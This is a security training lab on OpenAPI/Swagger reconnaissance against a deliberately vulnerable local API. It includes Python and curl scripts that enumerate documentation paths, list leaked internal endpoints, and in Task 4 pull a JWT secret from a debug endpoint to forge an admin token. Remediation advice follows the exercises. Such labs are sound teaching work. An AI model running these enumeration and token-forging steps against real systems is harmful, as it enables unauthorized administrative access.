# Lab: OpenAPI/Swagger Recon — Discovering Hidden Endpoints

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Discover the full attack surface via a leaked OpenAPI spec |
| **Difficulty** | ⭐ Easy                                              |
| **Time**       | 30 minutes                                            |
| **Category**   | Reconnaissance / Improper Inventory Management         |
| **OWASP**      | API9:2023 - Improper Inventory Management              |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- `curl`/`jq` or Python 3 with the `requests` library
- Completion of Lab 01 (API Reconnaissance) is recommended

---

## Background

Many teams auto-generate an OpenAPI/Swagger spec from their route table so frontend and partner developers always have accurate, up-to-date documentation. The generation process becomes a vulnerability when it isn't filtered before publishing — internal-only, debug, admin, and deprecated endpoints get swept into the same spec that's exposed to anyone who finds it.

SocialHack API serves such a spec at `/openapi.json` (with an HTML viewer at `/swagger`). Neither is listed in the root `/` endpoint index — they have to be discovered the same way `/api/v1/debug` was in earlier labs: by guessing common documentation-endpoint conventions.

---

## Tasks

### Task 1: Discover the Documentation Endpoint

**Steps:**
1. Try a list of common OpenAPI/Swagger paths against the API

**Python example:**
```python
import requests

BASE = "http://localhost:5001"
doc_paths = [
    "/openapi.json", "/swagger.json", "/swagger", "/swagger-ui",
    "/swagger-ui.html", "/api-docs", "/api/swagger.json", "/redoc", "/docs",
]

for path in doc_paths:
    r = requests.get(f"{BASE}{path}", timeout=3)
    print(f"{path:25} -> {r.status_code}")
```

**🚩 FLAG 1: Which path(s) return 200?**

<details>
<summary>💡 Hint 1</summary>
Two paths should respond: one returns raw JSON, the other returns an HTML page.
</details>

---

### Task 2: Count the Full Documented Attack Surface

**Steps:**
1. Fetch `/openapi.json` and count how many paths are documented

**curl example:**
```bash
curl -s http://localhost:5001/openapi.json | jq '.paths | keys | length'
```

**Python example:**
```python
r = requests.get(f"{BASE}/openapi.json")
spec = r.json()
print(f"Total documented paths: {len(spec['paths'])}")
```

<details>
<summary>💡 Hint 1</summary>
Compare this number to how many endpoints you found manually in Lab 01/the endpoint-discovery lab — the spec should reveal significantly more.
</details>

---

### Task 3: Extract "Internal" Endpoints That Shouldn't Be Public

**Steps:**
1. Filter the spec for paths tagged `x-internal: true`
2. List them out

**Python example:**
```python
internal = []
for path, methods in spec["paths"].items():
    for method, info in methods.items():
        if info.get("x-internal"):
            internal.append((method.upper(), path, info.get("summary")))

print(f"Found {len(internal)} internal endpoints leaked in the public spec:\n")
for method, path, summary in internal:
    print(f"  {method:6} {path:40} - {summary}")
```

**🚩 FLAG 2: How many endpoints are tagged `x-internal: true`? List their paths.**

<details>
<summary>💡 Hint 1</summary>
You should find endpoints from four different categories: admin panel, debug info, internal ops tools, and a deprecated API version.
</details>

---

### Task 4: Chain the Discovery Into a Real Attack

**Steps:**
1. Among the internal endpoints, find the one that leaks the JWT secret
2. Use it to forge an admin token (as in Lab 06 — Broken Function Level Authorization)

**Python example:**
```python
import jwt, time

r = requests.get(f"{BASE}/api/v1/debug")
jwt_secret = r.json()["jwt_secret"]

forged = jwt.encode(
    {"user_id": 1, "role": "admin", "iat": int(time.time()), "exp": int(time.time()) + 86400},
    jwt_secret, algorithm="HS256",
)
r = requests.get(f"{BASE}/api/v1/admin/users", headers={"Authorization": f"Bearer {forged}"})
print(f"Admin access via spec-discovered debug endpoint: {r.status_code}")
```

**🚩 FLAG 3: Successfully use the OpenAPI-discovered debug endpoint to gain admin access**

<details>
<summary>💡 Hint 1</summary>
This is the exact same JWT-forging technique from Lab 06 — the difference here is *how* you found the debug endpoint in the first place: through the leaked spec instead of guessing.
</details>

---

## Flags to Find

| Flag   | Description                                                | Hint                                       |
|--------|------------------------------------------------------------|---------------------------------------------|
| FLAG 1 | Working documentation endpoint(s) found                    | Try `/openapi.json` and `/swagger`           |
| FLAG 2 | List of internal endpoints leaked in the spec                | Filter on `x-internal: true`                 |
| FLAG 3 | Admin access gained via spec-discovered debug endpoint       | Same JWT-forge technique as Lab 06           |

---

## Remediation

### 1. Filter Internal/Deprecated Paths Before Publishing
```python
def build_public_openapi_spec():
    public_routes = [r for r in all_routes if not r.internal and not r.deprecated]
    return {"paths": {r.path: r.info for r in public_routes}}
```

### 2. Generate Separate Public vs. Internal Specs
- Public spec (for partners/frontend) should never include admin, debug, or ops-tooling paths.
- Internal specs should require VPN/internal-network access.

### 3. Protect the Documentation Endpoints Themselves
```python
@app.before_request
def protect_docs():
    if request.path in ("/openapi.json", "/swagger") and not is_authenticated_partner():
        return jsonify({"error": "Not found"}), 404
```

### 4. Add a CI Check That Fails on Leaked Internal Paths
- Before deploying, diff the published spec against the route table's `internal`/`deprecated` flags and fail the build if any leak through.

---

## References

- [OWASP API Security Top 10 - API9:2023](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
